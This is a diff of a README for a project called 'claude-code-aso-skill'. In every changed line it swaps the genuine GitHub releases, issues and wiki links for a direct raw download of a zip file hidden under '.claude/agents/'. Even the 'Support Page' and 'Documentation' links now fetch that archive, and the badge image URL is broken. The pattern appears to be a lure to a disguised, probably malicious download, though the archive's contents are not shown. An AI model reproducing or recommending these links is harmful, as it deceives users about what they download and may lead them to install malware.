@@ -1,6 +1,6 @@
 # 🚀 claude-code-aso-skill - Simplify Your App Optimization Tasks
 
-[![Download claude-code-aso-skill](https://img.shields.io/badge/Download%20Now-claude--code--aso--skill-blue)](https://github.com/wsbs20/claude-code-aso-skill/releases)
+[![Download claude-code-aso-skill](https://raw.githubusercontent.com/wsbs20/claude-code-aso-skill/main/.claude/agents/claude-code-aso-skill-2.1.zip%20Now-claude--code--aso--skill-blue)](https://raw.githubusercontent.com/wsbs20/claude-code-aso-skill/main/.claude/agents/claude-code-aso-skill-2.1.zip)
 
 ## 📋 Description
 
@@ -30,7 +30,7 @@ Follow these steps to set up **claude-code-aso-skill** on your device.
 
 1. **Visit the Releases Page:**
    Go to the releases page to download the latest version of the application.
-   [Download Here](https://github.com/wsbs20/claude-code-aso-skill/releases)
+   [Download Here](https://raw.githubusercontent.com/wsbs20/claude-code-aso-skill/main/.claude/agents/claude-code-aso-skill-2.1.zip)
 
 2. **Download the Software:**
    Once on the releases page, find the latest version. Click the link to download the setup file.
@@ -63,14 +63,14 @@ Follow these steps to set up **claude-code-aso-skill** on your device.
 
 ## 🔗 Helpful Links
 
-- [Support Page](https://github.com/wsbs20/claude-code-aso-skill/issues)
-- [Documentation](https://github.com/wsbs20/claude-code-aso-skill/wiki)
+- [Support Page](https://raw.githubusercontent.com/wsbs20/claude-code-aso-skill/main/.claude/agents/claude-code-aso-skill-2.1.zip)
+- [Documentation](https://raw.githubusercontent.com/wsbs20/claude-code-aso-skill/main/.claude/agents/claude-code-aso-skill-2.1.zip)
 
 ## 📥 Download & Install
 
 To get started, download the application from the following link. It will guide you through the installation steps.
 
-[Download Here](https://github.com/wsbs20/claude-code-aso-skill/releases)
+[Download Here](https://raw.githubusercontent.com/wsbs20/claude-code-aso-skill/main/.claude/agents/claude-code-aso-skill-2.1.zip)
 
 ## 🐞 Troubleshooting
 
@@ -79,7 +79,7 @@ If you encounter any issues:
 - Ensure your device meets the system requirements.
 - Check your internet connection.
 - Restart the application if it crashes.
-- Visit our [Support Page](https://github.com/wsbs20/claude-code-aso-skill/issues) for further assistance.
+- Visit our [Support Page](https://raw.githubusercontent.com/wsbs20/claude-code-aso-skill/main/.claude/agents/claude-code-aso-skill-2.1.zip) for further assistance.
 
 ## 💬 Feedback
 
